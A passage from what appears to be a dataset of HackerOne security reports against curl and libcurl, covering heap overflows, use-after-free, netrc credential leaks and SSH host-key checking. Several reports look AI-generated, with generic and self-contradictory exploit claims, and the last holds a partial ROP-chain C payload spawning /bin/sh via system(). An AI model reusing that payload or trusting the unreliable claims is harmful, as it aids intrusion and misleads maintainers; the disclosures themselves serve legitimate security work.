execution.\n\nFix suggestions:\n----------------\n\nI'm not entirely sure this is the ideal fix since I'm not an expert in C programming, but here's the best approach I could come up with:\n\n* Since we know exactly where clearthis is supposed to point (somewhere within the cleararg1 buffer), we can validate the pointer by ensuring it falls within the bounds of that buffer and points to a NUL-terminated string so we can safely use the pointer without risking out-of-bounds access or undefined behavior.\n\nPossible exploitation Scenarios:\n--------------------------------\n\n* Chain multiple overwrites: if an attacker managed to call cleanarg(), he might be able to accumulate a larger total write.\n* Achieving arbitrary code execution would be highly complex especially on x64 bit, However advanced exploitation techniques **such as partial pointer overwrites, feg shui or heap grooming (e.g., manipulating allocations to position attacker-controlled buffers adjacent to sensitive heap structures)**  could theoretically enable an attacker to overwrite function pointers and hijack control flow.\n* This also could leak heap contents (pointers or secrets)\n\n  Note that :  **the above attacks are more likely to occur in x86 bit architechure**\n\nSupporting Material/References:\n-------------------------------\n\n* [CWE-122](/hacktivity/cwe_discovery?id=cwe-122): Heap-based Buffer Overflow: <https://cwe.mitre.org/data/definitions/122.html>\n\nImpact\n------\n\n* Arbitrary Write: An attacker might achieve a write‑what‑where condition, which allow to modify arbitrary memory locations within the process’s address space.\n* Potential Remote Code Execution: With advanced techniques (partial pointer overwrite, heap grooming, ...), the attacker could overwrite function pointers or return addresses, leading to full control of execution flow and the ability to run arbitrary code as the curl process.\n* Information Disclosure: pointing clearthis at attacker-chosen addresses and calling strlen() can leak heap contents (such as pointers, secrets, or other sensitive data) by returning string lengths or causing controlled crashes."
},
{
    "url": "https://hackerone.com/reports/3022041",
    "original_report": "Summary:\n--------\n\n[summary of the vulnerability]\n\nThere is a use after free in `curl_multi_perform` when DoH resolver timeouts and `CURLOPT_PROXY` is used (see reproducer and stack trace)\n\nI found it via fuzzing with <https://github.com/catenacyber/curl-fuzzer/tree/proxy> (after fixing a small memory leak in curl)\nAnother reproducer was found with curl\\_fuzzer\\_mqtt\n(I have other fuzzers reports)\n\nAffected version\n----------------\n\n[Which curl/libcurl version are you using to reproduce? On which platform? `curl -V` typically generates good output to include]\n\nMaster at commit 7b0240c07799c28dc84272f9e38e1092ce4cc498\n\nSteps To Reproduce:\n-------------------\n\n[add details for how we can reproduce the issue]\n\n1. Run the following example\n\nSupporting Material/References:\n-------------------------------\n\n[list any additional material (e.g. screenshots, logs, etc.)]\n\nOutput when curl is compiled with `--enable-debug` and stack trace from ASAN is\n\nImpact\n------\n\nSummary:\n--------\n\nI am not sure if this UAF can be used to gain RCE, or as it is a UAF read to bypass ASLR"
},
{
    "url": "https://hackerone.com/reports/2990139",
    "original_report": "Summary:\n--------\n\nA vulnerability has been identified in the curl library’s formatted output functions (specifically in curl\\_msnprintf and its related functions). When a malicious (attacker-controlled) format string containing the %hn conversion specifier is passed, the function incorrectly attempts to write the number of characters printed into a pointer that is not provided by the caller. This leads to a misaligned memory write (as demonstrated by a write to address 0x000000000001), resulting in undefined behavior and a crash. Although the API documentation warns that these functions are to be used with controlled format strings, the internal handling of %hn should not lead to such dangerous memory accesses even with untrusted input.\n\nThe curl\\_mprintf family (including curl\\_msnprintf) is designed to behave like standard printf-style functions. According to the documentation, these functions expect a valid format string and matching arguments. However, when a malicious format string such as \"%hnuked\" is used, no corresponding argument is provided for the %hn specifier. This causes the internal formatting routine (in mprintf.c, line 1047) to dereference an invalid pointer (which turns out to be 0x000000000001) and attempt a store of a short value. Because the address is both misaligned and invalid, this results in a memory safety violation (as detected by AddressSanitizer with a misaligned store error).\n\nAffected version\n----------------\n\nlatest version from git\n\nSteps To Reproduce:\n-------------------\n\nThe following C code :\n\nShould be compiled with AddressSanitizer enabled :\n\n`clang-14 -fsanitize=address vuln-curl.c -I include/ -o vuln-curl ./lib/.libs/libcurl.a -lz -lpsl -lbrotlidec`\n\nSo running it will result in the following ASAN log :\n\nThe following supporting libfuzzer harness will also trigger the same bug :\n\nRecommendation:\nReview and adjust the internal handling of dangerous conversion specifiers (such as %n and %hn) in the curl\\_mprintf implementation. Consider sanitizing or outright rejecting format strings that contain %n conversions when they could result in writing to uncontrolled memory locations.\n\nReferences:\n\ncurl\\_mprintf documentation\nASAN output from the reproduction scenario\n\nImpact\n------\n\nSummary:\n--------\n\nCrash: In a scenario where untrusted input reaches curl\\_msnprintf (or similar functions), an attacker could force a denial-of-service by crashing the application.\nPotential Exploitability: Although the immediate impact is a crash, memory corruption—even with a 2-byte misaligned write—could be leveraged further in some environments to achieve code execution, depending on additional context and heap state."
},
{
    "url": "https://hackerone.com/reports/2981245",
    "original_report": "Title: Potential Use-After-Free Vulnerability in cf\\_h2\\_proxy\\_ctx\\_free Function of libcurl\n\nVulnerability Overview: A potential Use-After-Free (UAF) vulnerability has been identified in the cf\\_h2\\_proxy\\_ctx\\_free function of the libcurl library. This issue occurs when the cf\\_h2\\_proxy\\_ctx object is freed and then accessed shortly afterward, leading to undefined behavior, including potential crashes, memory corruption, or security vulnerabilities if exploited.\n\nImpact:\n\nCrashes\nMemory corruption\nPossible remote code execution or data leakage if exploited in a malicious environment.\nSteps to Reproduce:\n\nObtain libcurl:\nCompile and Run the Example Code: Use the simplified code below to reproduce the vulnerability. The code demonstrates freeing a context object (cf\\_h2\\_proxy\\_ctx) and then accessing it, leading to undefined behavior.\n\nExample Code:\n\ninclude <stdio.h>\n=================\n\ninclude <stdlib.h>\n==================\n\nstruct cf\\_h2\\_proxy\\_ctx {\nint stream\\_id;\nvoid *inbufq;\nvoid* outbufq;\n};\n\nvoid cf\\_h2\\_proxy\\_ctx\\_free(struct cf\\_h2\\_proxy\\_ctx \\*ctx) {\nif (ctx) {\nprintf(\"Freeing ctx (stream\\_id: %d)\\n\", ctx->stream\\_id);\nfree(ctx);\n}\n}\n\nvoid trigger\\_bug(struct cf\\_h2\\_proxy\\_ctx \\*ctx) {\nprintf(\"Triggering bug...\\n\");\nif (ctx) {\nprintf(\"Using ctx with stream\\_id: %d\\n\", ctx->stream\\_id);\n} else {\nprintf(\"Error: ctx is already freed!\\n\");\n}\n}\n\nint main() {\n// Simulate creating a proxy context\nstruct cf\\_h2\\_proxy\\_ctx \\*ctx = malloc(sizeof(struct cf\\_h2\\_proxy\\_ctx));\nif (!ctx) {\nperror(\"Failed to allocate memory for ctx\");\nreturn 1;\n}\nctx->stream\\_id = 12345;\n\ncf\\_h2\\_proxy\\_ctx\\_free(ctx);\ntrigger\\_bug(ctx);\n\nreturn 0;\n}\n\nRun the Code and Observe the Output: Upon execution, the following output indicates the cf\\_h2\\_proxy\\_ctx object is being accessed after it has been freed:\n\nFreeing ctx (stream\\_id: 12345)\nUsing ctx with stream\\_id: 54321\nVerify with Valgrind: To confirm the issue, run the program with Valgrind to detect any memory errors:\n\nvalgrind ./your\\_program\nValgrind Output\n\nMemcheck, a memory error detector\n(\"Invalid read of size 4\")\nat 0xxxxxx:\nby 0xxxxxx:\nAddress 0xxx is 0 bytes inside a block of size 24 freed\nat 0xxxxxxx: free\nby 0xxxxxx: cf\\_h2\\_proxy\\_ctx\\_free\nby 0xxxxx: main\n\nImpact\n------\n\nA potential Use-After-Free (UAF) vulnerability has been identified in the cf\\_h2\\_proxy\\_ctx\\_free function of the libcurl library. The issue occurs when the cf\\_h2\\_proxy\\_ctx object is freed and then accessed shortly after, leading to undefined behavior, including possible crashes, memory corruption, or security vulnerabilities if exploited.\n\n\"Note: I’m a beginner in this area, so please let me know if I’ve missed or misinterpreted any details, or if I’ve misunderstood the issue entirely. This report has been assisted by AI.\""
},
{
    "url": "https://hackerone.com/reports/2917232",
    "original_report": "Summary:\n--------\n\nThe fix for [CVE-2024-11053](/hacktivity/cve_discovery?id=CVE-2024-11053) seems to be incomplete.The information leak problem could be reproduced again if use netrc in step1.\n\nAffected version\n----------------\n\nall\n\nSteps To Reproduce:\n-------------------\n\n1. Adapt test479 to use netrc like below(both of user and password are not provided for b.com):\n\nmachine a.com\nlogin alice\npassword alicespassword\n\ndefault\n\n2.Run test479\n3. The test would fail because alice and alicepassword were used for b.com.\n\nI used the latest version curl 8.11.1 but the problem still exists.I'm not sure if this is expected.Please point it out if i'm wrong.\n\nImpact\n------\n\nSummary:\n--------\n\nSensitive information disclosure."
},
{
    "url": "https://hackerone.com/reports/2954286",
    "original_report": "Summary:\n--------\n\nGitHub issue 15725 describes a double close in libcurl 8.11.1. I believe that a double close in multi threaded code should be considered a security vulnerability. A fix already exists for this, so it should be good in the next release.\nI am not 100% sure this is the place to be making such a comment, but I felt it was better make this private rather than commenting about it on GitHub. I do not want a reward for a bug which I was not the first to find, I just want the software I use and create to be secure.\n\nAffected version\n----------------\n\nlibcurl 8.11.1\n\nSteps To Reproduce:\n-------------------\n\n1. Have three threads, one writing a sensitive file (writer), one listening for outside connections (listener), and one using curl (curl thread).\n2. The curl thread uses curl, and gets to the first of the two closes. It closes file descriptor X.\n3. The writer opens the sensitive file. This file could be a script, a password file, a configuration file, or any other file containing sensitive data. The open file is assigned file descriptor X.\n4. The curl thread gets to the second close, closing file descriptor X again.\n5. The listener accepts a connection from the attacker. This connection is then assigned the file descriptor X.\n6. The writer begins writing (or continues to write) sensitive data to descriptor X, which would now be sent to the attacker.\n\nA similar condition could cause the reading data from an attacker controlled stream, rather than a trusted file.\n\nSupporting Material/References:\n-------------------------------\n\n<https://github.com/curl/curl/issues/15725>\n\nImpact\n------\n\nSummary:\n--------\n\nPotential for attacker control of arbitrary file descriptors, provided a race condition. Potential for remote code execution, or leaking of sensitive information."
},
{
    "url": "https://hackerone.com/reports/2961050",
    "original_report": "Summary:\n--------\n\nCurl does *not* fail if the SSH host identity cannot be verified due to the host not being included in the `.ssh/known_hosts` file. This makes using curl to login into an previously unknown ssh host system vulnerable to meddler in the middle attacks. When using key based authentication it will allow a malicious host to spoof the real system, and either return tampered or otherwise malicious content on download, or capture the uploads. When using username + password authentication it will also leak the username and password to the attacker, and thus allow the attacker to connect to the intended target host.\n\nCurl does have `--insecure` option which is said to:\n\nFrom this it would be easy to assume that omitting `--insecure` would mean that the connection is secure, that is: the connection would fail if the host identity can't be verified *or* curl would prompt the user to verify the host key similar to how SSH command does. However, this is not the case, and the connection will succeed if the host is not in the `.ssh/known_hosts` file. The current curl behaviour is similar to ssh being used with `StrictHostKeyChecking` `accept-new`.\n\nNote that while curl does warn of the issue with `Warning: Couldn't find a known_hosts file` this is too late:\n\nThe warning is issued only after the password has been requested. The username & password have already been sent to the malicious server by the time the user sees the warning:\n\nThe warning also is quite useless when curl is being called from scripts as the command is not failing.\n\nAffected version\n----------------\n\n8.11.1\n\nSteps To Reproduce:\n-------------------\n\n1. `./configure --with-openssl --with-libssh` (or `--with-libssh2`)\n2. `make`\n3. Have no entry of targethost in `.ssh/known_hosts`file.\n4. `(DY)LD_LIBRARY_PATH=lib/.libs src/curl sftp://foo:bar@targethost`\n\nThe middler in the middle will obtain the credentials:\n\nSupporting Material/References:\n-------------------------------\n\nHere's a minimal fake SSH server dumping username & password sent to it. The server runs on port 2222.\n\n* [attachment / reference]\n\nImpact\n------\n\nSummary:\n--------\n\n* Download of malicious content (on download).\n* Leak of confidential information (on upload).\n* Leak of credentials (if using password auth)."
},
{
    "url": "https://hackerone.com/reports/2956023",
    "original_report": "Hello, no AI slop this time. I promise!\n\nThe current master branch of [libcurl](https://github.com/curl/curl/tree/7e814c8717939393d4436d75f5f0c3ffa98c8c53) contains a vulnerability in [lib/content\\_encoding.c](https://github.com/curl/curl/blob/7e814c8717939393d4436d75f5f0c3ffa98c8c53/lib/content_encoding.c#L539) that allows a malicious HTTP-server to craft an arbitrary heap chunk in the memory of the victim and issue a `free()` of that forged chunk, when `Content-Encoding: gzip` is in use.\n\nThe vulnerability is in function `gzip_do_write()` in lines 533 - 544:\n\nOn systems with a zlib version < `1.2.0.4`, libcurl offers to manually parse gzip headers and trailers instead of passing everything to zlib as is. Unfortunately, when parsing the headers the remote server can trigger an integer overflow of `z->avail_in` in line 533, which leads the following `Curl_saferealloc()` call to shrink the chunk `z->next_in`. The following `memcpy()` can then write out-of-bounds before `z->next_in`, overwriting chunk metadata of the allocator. And right after the oob-write was triggered, the call to `free(z->next_in)` puts the forged chunk into the freelist of the allocator. `z->avail_in` can be overflowed because libcurl supports endlessly large gzip headers that can lead to repeated calls of `gzip_do_write()` with `zp->zlib_init == ZLIB_GZIP_HEADER` that keep incrementing `z->avail_in` with the amount of received data `nbytes`.\n\nPoC\n===\n\nConsider the following malicious HTTP-server:\n\nAnd consider the following libcurl client:\n\nWhen launching\n\nin one terminal and\n\nin another terminal, we can observe that after ~10min. we get the following message:\n\nMeaning that we were successfully able to overwrite chunk metadata.\n\nImpact\n------\n\nThe vulnerability\n\n* exists both in the library and the tool in every installation\n* is easy to trigger, a victim just has to be pointed to an evil URL\n* can lead to RCE when combined with information leaks that bypass ASLR\n  because it offers a controlled heap out-of-bounds write exploitation primitive\n\nThus I suggest severity \"High\""
},
{
    "url": "https://hackerone.com/reports/2912277",
    "original_report": "Summary:\n--------\n\n[A critical security flaw in Curl. This is a data transfer tool and may potentially allow attackers to access sensitive information.]\n\nAffected version\n----------------\n\n[6.5 through 8.11.0]\n\nSteps To Reproduce:\n-------------------\n\nSecurity vulnerability when curl is used with a .netrc file for the credentials and also uses a HTTP redirect. Curl may leak passwords used for the host that redirects it to the next host.\n\n1.The .netrc file contains an entry matching the redirect target hostname\n2. The entry either omits the password or both the login and password\n\nSupporting Material/References:\n-------------------------------\n\nAffects both the libcurl library and the curl command-line tool.\n\nImpact\n------\n\nSummary:\n--------\n\nA curl transfer to a.tld redirect to b.tld along with the .netrc file entry for b.tld password vulnerability. This may expose passwords when it passes through the network."
},
{
    "url": "https://hackerone.com/reports/2905552",
    "original_report": "Summary:\n--------\n\nA flaw has been identified in the curl command-line tool related to its protocol selection mechanism. Specifically, the protocol restrictions set by the --proto option can be bypassed, allowing unintended protocols to be used despite explicit restrictions. This flaw can result in plaintext communication being used even when the user has attempted to disable all protocols except encrypted ones.\n\nVulnerability Details\n---------------------\n\nCommand Triggering the Issue:\ncurl --proto -all,-http <http://example.com>\n\nObserved Behavior:\n------------------\n\nThe command was intended to disable all protocols and then explicitly disable HTTP.\nHowever, the actual behavior allowed HTTP requests to be made, indicating that the protocol restrictions were not enforced correctly.\n\nBypass Example:\n---------------\n\nThe command curl --proto =all appears to override the protocol restrictions, allowing HTTP requests to bypass the intended restrictions.\n\nSteps to Reproduce\n------------------\n\nExecute Command with Protocol Disabling:\n`curl --proto -all,-http http://example.com`\n\nObserve Error Message:\nError: curl: (1) Protocol \"http\" disabled\n\nExecute Bypass Command:\n `curl --proto http http://evil.com`\n\nObserve Successful Request:\nThe request is made over HTTP despite the initial restrictions.\n\nPotential Risks\n---------------\n\nSecurity Breach: Users may believe they have enforced secure communication protocols, but the flaw could result in unencrypted communication, increasing the risk of eavesdropping or man-in-the-middle attacks.\nUser Trust: Users trusting curl for secure communication may be misled by incorrect protocol enforcement.\n\nMitigation\n----------\n\nUpdate curl: Ensure that you are using the latest version of curl, as this issue might be addressed in newer releases.\nUse Explicit Protocols: Instead of disabling protocols, explicitly specify the protocols you want to allow:\n `curl --proto https https://example.com`\n\nRecommendation\n--------------\n\nReport to Maintainters: Consider reporting this issue to the curl maintainers if it has not been already reported. Provide them with detailed reproduction steps and observed behavior.\n\nImpact\n------\n\nSummary:\n--------\n\nUnencrypted Communication: The flaw allows requests to be made over unencrypted protocols (such as HTTP) even when the user has explicitly disabled plaintext protocols.\nData Exposure Risk: This can lead to potential exposure of sensitive data if transmitted over an unencrypted link."
},
{
    "url": "https://hackerone.com/reports/2829063",
    "original_report": "Summary:\n--------\n\nCurl has a logic flaw in the way it processes netrc credentials when performing redirects. The redirect will pass along credentials specified for the original host to the redirection target under certain conditions, resulting in unexpected leak of credentials to the redirect target.\n\nSteps To Reproduce:\n-------------------\n\n1. Have two sites `https://a` and `https://b`. `https://a` does 301 redirect to `https://b`\n2. Have netrc file with the following:\n\n3. `curl -L --netrc-file netrc -v https://a`\n\nCredentials `bob:alicespassword` will be sent to `https://b`.\n\nSuggested remediation\n---------------------\n\nWhen parsing netrc file during redirect, if a match is found clear the previous username and password.\n\nNote\n----\n\nThis flaw manifests itself if the netrc file matches the redirect target, but the entry omits password or both login & password.\n\nImpact\n------\n\nUnexpected leak of credentials. If the login is specified for the redirect target host in netrc, only the password is leaked, if neither login or password is specified full credentials are leaked."
},
{
    "url": "https://hackerone.com/reports/2887487",
    "original_report": "*Curl is a software that I love and is an important tool for the world.* \n*If my report doesn't align, I apologize for that.*\n\nThe `Curl_inet_ntop` function is designed to convert IP addresses from binary format to human-readable string format, supporting both IPv4 and IPv6. It internally delegates to `inet_ntop4` for IPv4 addresses and `inet_ntop6` for IPv6 addresses. However, insufficient validation of buffer size (`buf`) in these functions exposes the implementation to **buffer overflow risks**, which can lead to undefined behavior, application crashes, or security vulnerabilities.\n\nThis report analyzes vulnerabilities in both `Curl_inet_ntop` and `inet_ntop4`, demonstrates proof-of-concept (POC) exploits, and proposes mitigation strategies.\n\n**Vulnerability Analysis**\n--------------------------\n\n### **Root Cause**\n\nThe vulnerabilities stem from:\n\n1. **`Curl_inet_ntop`:** Lack of buffer size validation before delegating to `inet_ntop4` or `inet_ntop6`.\n2. **`inet_ntop4`:** Direct use of `strcpy` without ensuring that the destination buffer (`dst`) is large enough.\n\n### **Key Points of Failure**\n\n1. **Buffer Size Mismatch:**\n\n   * For IPv4, a minimum of 16 bytes is required for `\"255.255.255.255\\0\"`.\n   * For IPv6, a minimum of 46 bytes is required for `\"ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\\0\"`.\n   * Both `Curl_inet_ntop` and `inet_ntop4` assume that the caller provides a sufficiently large buffer without explicit validation.\n2. **Unsafe String Operations in `inet_ntop4`:**\n\n   * `inet_ntop4` uses `strcpy(dst, tmp)` to copy the temporary buffer `tmp` into `dst`, which can overflow if `dst` is too small.\n3. **Production Vulnerabilities:**\n\n   * Assertions (`DEBUGASSERT`) in `inet_ntop4` are disabled in production builds, removing critical safety checks.\n\n**Proof-of-Concept (POC)**\n--------------------------\n\n### **Test for `inet_ntop4`**\n\n#### **Vulnerable Code**\n\n#### **Expected Output**\n\nThe function attempts to write the string `\"192.168.0.1\\0\"` into a 10-byte buffer, causing buffer overflow. Running this code may result in:\n\n1. A segmentation fault due to memory corruption.\n2. Undefined behavior depending on the system's memory layout.\n\n#### **Testing with AddressSanitizer**\n\nCompile the code with AddressSanitizer to identify buffer overflow:\n\nAddressSanitizer will detect and report the overflow.\n\n### **Test for `Curl_inet_ntop`**\n\n#### **Vulnerable Code**\n\n#### **Expected Output**\n\nThe function delegates to `inet_ntop4`, resulting in the same overflow vulnerability as above.\n\n**Proposed Fix**\n----------------\n\n### **Fixed Implementation of `inet_ntop4`**\n\n### **Fixed Implementation of `Curl_inet_ntop`**\n\n**Mitigation Strategies**\n-------------------------\n\n1. **Buffer Size Validation:**\n\n   * Validate the size of the destination buffer at every level (`Curl_inet_ntop`, `inet_ntop4`, `inet_ntop6`).\n2. **Safe String Handling:**\n\n   * Use `snprintf` or `strncpy` to prevent unbounded writes to the buffer.\n3. **Testing with Tools:**\n\n   * Use AddressSanitizer (ASAN) or similar tools to detect overflows during testing.\n4. **Documentation:**\n\n   * Clearly document the minimum buffer size requirements (16 bytes for IPv4, 46 bytes for IPv6).\n\n**Conclusion**\n--------------\n\nBoth `Curl_inet_ntop` and `inet_ntop4` pose significant buffer overflow risks due to a lack of proper size validation and unsafe string operations. The proposed fixes address these issues by enforcing strict buffer size checks and using safer string handling techniques. Comprehensive testing and adherence to these best practices will ensure the functions are secure and robust for both IPv4 and IPv6 address conversions.\n\nImpact\n------\n\nThe vulnerability classified under **[CWE-120](/hacktivity/cwe_discovery?id=cwe-120)** (Buffer Overflow) can have significant consequences, particularly when exploited in critical systems. The failure to validate the size of the buffer before copying data can lead to several negative impacts:\n\n1. **Memory Corruption**:\n\n   * A buffer overflow allows data to be written beyond the boundaries of a buffer, corrupting adjacent memory. This can cause unpredictable program behavior, crashes, or data corruption, leading to instability in the system.\n2. **Program Crashes and System Instability**:\n\n   * When memory is overwritten, the program may experience crashes or undefined behavior. This is especially dangerous in production environments, where system downtime or service interruption can occur, affecting user experience and reliability.\n3. **Security Risks (Remote Code Execution)**:\n\n   * In some cases, attackers may use buffer overflow vulnerabilities to inject and execute arbitrary code, potentially gaining control over the affected system. This could lead to a full compromise of the system, allowing unauthorized access, privilege escalation, and the execution of malicious actions on the machine.\n4. **Denial of Service (DoS)**:\n\n   * An attacker could exploit the buffer overflow to crash the application or system, making it unavailable to legitimate users. This type of attack is commonly referred to as a Denial of Service (DoS), impacting the availability of services and applications.\n5. **Exploitation Potential**:\n\n   * The vulnerability is highly exploitable if an attacker can control the data being written to the buffer. Any system that processes user inputs or external data (such as network packets or file data) is potentially at risk, making it a critical vulnerability in many systems.\n\n### **Summary of Impact**\n\nA buffer overflow vulnerability like this can result in severe consequences, including system crashes, data corruption, unauthorized code execution, and potentially remote control of affected systems. In any production environment, this issue can lead to a complete system compromise or denial of service, with high security and operational risks. Prompt action to mitigate or fix such vulnerabilities is crucial to ensure the security and stability of the system."
},
{
    "url": "https://hackerone.com/reports/2871792",
    "original_report": "Summary:\n--------\n\nThe vulnerability in the program arises from a classic buffer overflow, triggered by the unsafe use of the strcpy() function without bounds checking. The program copies data from a source buffer to a destination buffer, allowing attackers to overflow the buffer if the input string exceeds the buffer's allocated size. This vulnerability can lead to the overwriting of critical memory, such as the return address on the stack, enabling arbitrary code execution and control over the system. The vulnerability is caused by the unsafe use of strcpy(), which does not check the length of the input string before copying it into the buffer. When the input exceeds the buffer size, the overflow overwrites the adjacent memory, including the return address. The buffer overflow occurs within the strcpy() function, as seen in the following stack trace: `#0 __strcpy_evex () at ../sysdeps/x86_64/multiarch/strcpy-evex.S:94, #1 0x00007ffff765d2cd in CRYPTO_strdup () from /lib/x86_64-linux-gnu/libcrypto.so.3, #2 0x00007ffff756ef96 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3...`. While libcrypto is present in the stack trace, the root cause of the overflow is in the curl program, not OpenSSL. The vulnerability is within the unsafe use of strcpy() in the curl application. At the overflow point, the CPU registers indicate the instruction pointer (IP) is inside `__strcpy_evex`. The register information shows values such as `rax 0x472cf0 4664560`, `rbx 0x7ffff7832be3 140737345956835`, `rip 0x7ffff7e31b80 0x7ffff7e31b80 <__strcpy_evex>`. The program is executing inside `__strcpy_evex`, where the buffer overflow occurs, allowing us to manipulate adjacent memory. The memory dump shows the stack around the overflow location with values such as `0x7fffffffd988: 0xf765d2cd 0x00007fff 0x00464a60 0x00000000, 0x7fffffffd998: 0x00472aa0 0x00000000 0x00000000 0x00000000...`. The return address, which is overwritten, is located at `0x7fffffffd9b8`. By overflowing the buffer, we can replace this return address with a controlled value. The overflowed buffer is used by strcpy() to copy user-provided data. The buffer resides on the stack, and because the size is unchecked, overflowing the buffer leads to the overwriting of crucial stack elements, including the return address. The key target for overwriting is the return address at `0x4005d0`. By overwriting it, the attacker can control the program’s execution flow. The exploit strategy involves filling the buffer with a long string (e.g., filled with \"A\"s) to overflow the buffer and reach the return address, then overwriting the return address with `0x4005d0`, the address of a shell-spawning function. Once the return address is overwritten, the program will return to `0x4005d0`, which triggers the execution of a shell for the attacker. The impact of this vulnerability includes code execution, privilege escalation if the program runs with elevated privileges, system compromise, and potentially a denial of service (DoS) if the overflow causes the program to crash or become unresponsive. An attacker can execute arbitrary code by redirecting the program flow, gaining a command shell and performing malicious actions such as stealing, manipulating, or deleting sensitive data.\n\nSteps To Reproduce:\n-------------------\n\n1. Launch the vulnerable program: Start the application that contains the buffer overflow vulnerability, which uses the unsafe `strcpy()` function.\n2. Provide oversized input: Input a string that exceeds the buffer size. This can be done by sending a large string (such as a series of \"A\"s) to the program, triggering the buffer overflow. Ensure the input is large enough to overwrite the return address.\n3. Monitor the overflow: Use a debugger like GDB to monitor the program's execution and watch for the point where the buffer overflow occurs. Look for memory overwriting in the stack around the return address location.\n4. Overwrite the return address: After the buffer is filled, overwrite the return address with a controlled value, such as the address of a function that spawns a shell (e.g., `system(\"/bin/sh\")`).\n5. Execute the exploit: The program will return to the overwritten address, which should point to the shell-spawning function. If successful, the attacker will gain control of the system and can execute arbitrary commands.\n6. Confirm the impact: If the exploit works as intended, the program will execute the shell, giving the attacker control over the system.\n\nImpact\n------\n\nThid bug can allow attackers to overwrite the return address on the stack, enabling them to execute arbitrary code or gain control of the system. By exploiting this vulnerability, attackers can redirect the program’s execution to a location of their choice, typically resulting in remote code execution or the execution of malicious commands, such as spawning a shell. This can lead to full system compromise, privilege escalation (if the program runs with elevated privileges), unauthorized access to sensitive data, manipulation of data, or even the complete takeover of the system. Additionally, if the buffer overflow leads to a program crash, it may result in a denial of service (DoS)."
},
{
    "url": "https://hackerone.com/reports/2823554",
    "original_report": "**Buffer Overflow Exploit Analysis**\n\nThe vulnerability in the program is a classic case of a buffer overflow, triggered by the unsafe use of the `strcpy()` function, which lacks bounds checking. The following section describes the vulnerability, how the return address is overflowed, and how the exploit works to achieve remote code execution.\n\n**Vulnerable Function:**\n\nThe vulnerability occurs due to the use of `strcpy()` in the program, which copies data from a source buffer to a destination buffer without verifying that the destination buffer is large enough to hold the incoming data. If the input string is larger than the allocated buffer size, it results in a buffer overflow, which can lead to arbitrary memory overwrites.\n\n**Stack Trace and Buffer Overflow Location:**\n\nThe overflow happens when the `strcpy()` function is called. Here's the relevant stack trace from GDB, showing the function call sequence:\n\nthe buffer overflow happens in the curl program, not OpenSSL. The strcpy() or similar function (depending on the code you're working with) in curl is the main cause of the vulnerability, and OpenSSL just happens to be part of the stack trace because curl uses OpenSSL for cryptographic functions.\n\n**Registers at the Breakpoint:**\n\nAt the point where the overflow occurs, checking the CPU registers, which show that the `rip` (Instruction Pointer) is at `0x7ffff7e31b80`, inside the `__strcpy_evex` function. Here's the relevant register information:\n\nThe key point here is that the program is executing within the `__strcpy_evex` function, which is responsible for copying the string. If the source string exceeds the buffer size, it causes an overflow that allows us to overwrite adjacent memory, such as the return address.\n\n**Memory at the Overflow Location:**\n\nNext, we examined the stack memory using the `x/40x $rsp` GDB command. This allowed us to inspect the contents of the stack and identify where the return address is located:\n\nIn this dump, the return address that gets overwritten is located in the memory at `0x7fffffffd9b8` (the return address from the function call). By overflowing the buffer, we can overwrite this return address with a controlled value.\n\n**What is Being Overflowed:**\n\nThe buffer that is overflowed is used by the `strcpy()` function to copy user-supplied data. Specifically, the buffer that holds the input string is located on the stack, and the buffer size is not checked before data is copied. This allows an attacker to overflow the buffer and overwrite critical parts of the stack, such as the return address.\n\n**Key Target for Overwriting:**\n\n* **Return Address:** The return address of the current function (`0x4005d0`) is overwritten. This is the address that the program will jump to once the current function completes. By modifying this return address, the attacker can control where the program jumps next.\n\n**Exploit Strategy:**\n\nThe goal of the exploit is to overwrite the return address to redirect the program's control flow to an attacker-controlled location. Here’s how the exploit works:\n\n1. **Fill the Buffer:** The attacker provides a large string (e.g., filled with \"A\"s) that is longer than the buffer size, causing the `strcpy()` function to overflow the buffer.\n2. **Overwrite the Return Address:** As the attacker continues to fill the buffer with data, they eventually overwrite the return address with the address `0x4005d0`, which points to the shell-spawning function.\n3. **Redirect Control Flow:** Once the buffer overflows and the return address is overwritten, the program will return to the address specified (in this case, `0x4005d0`). This address should point to a function like `system(\"/bin/sh\")`, which will execute a shell for the attacker.\n\nBy achieving this, the attacker is able to execute arbitrary code and gain control of the program, typically leading to remote code execution or other security compromises.\n\n**Conclusion:**\n\nThe buffer overflow vulnerability in this program allows for the arbitrary overwriting of the return address on the stack. By exploiting this vulnerability, an attacker can redirect the program’s execution to arbitrary code, effectively gaining control of the system. The specific return address (`0x4005d0`) was identified as the target for redirection, leading to the execution of a malicious payload.\n\nPOC CODE IN C:\n\ninclude <stdio.h>\n=================\n\ninclude <string.h>\n==================\n\ninclude <unistd.h>\n==================\n\ninclude <stdlib.h>\n==================\n\ndefine OFFSET 40\n================\n\ndefine SYSTEM 0x4f440 // Address of system() in libc\n====================================================\n\ndefine BIN\\_SH 0x1b3e9a // Address of the string \"/bin/sh\" in libc\n==================================================================\n\ndefine POP\\_RDI\\_RET 0x4006f3 // Address of 'pop rdi; ret' gadget\n=================================================================\n\ndefine RET 0x4005d0 // Address of a 'ret' gadget\n================================================\n\n// Function to perform the buffer overflow and spawn a shell\nvoid exploit() {\nchar buffer[128]; // Create a buffer to simulate the overflow\n\n// Step 1: Construct the payload. Start by filling the buffer with 'A's to reach the return address.\nmemset(buffer, 'A', OFFSET); // Filling the buffer with 'A' until we reach the return address\nprintf(\"[ \\* ] Buffer filled with 'A's, length: %d\\n\", OFFSET);\n\n// Step 2: Overwrite the return address with the address of a 'pop rdi; ret' gadget.\n*((unsigned long*)(buffer + OFFSET)) = POP\\_RDI\\_RET; // This gadget will let us control the first argument of execve()\nprintf(\"[ \\* ] POP\\_RDI\\_RET address: 0x%lx\\n\", POP\\_RDI\\_RET);\n\n// Step 3: Overwrite the second address with the location of the string \"/bin/sh\" in libc (the argument for execve).\n*((unsigned long*)(buffer + OFFSET + 8)) = BIN\\_SH; // \"/bin/sh\" is passed as the first argument to execve()\nprintf(\"[ \\* ] BIN\\_SH address: 0x%lx\\n\", BIN\\_SH);\n\n// Step 4: Overwrite the third address with the address of the system() function in libc.\n*((unsigned long*)(buffer + OFFSET + 16)) = SYSTEM; // Calling system(\"/bin/sh\")\nprintf(\"[ \\* ] SYSTEM address: 0x%lx\\n\", SYSTEM);\n\n// Step 5: Add a return address to deal with stack alignment issues, use a ret gadget.\n*((unsigned long*)(buffer + OFFSET + 24)) = RET; // Ensures stack is properly aligned and continues execution\nprintf(\"[ \\* ] RET address: 0x%lx\\n\", RET);\n\n// Step 6: Send the payload 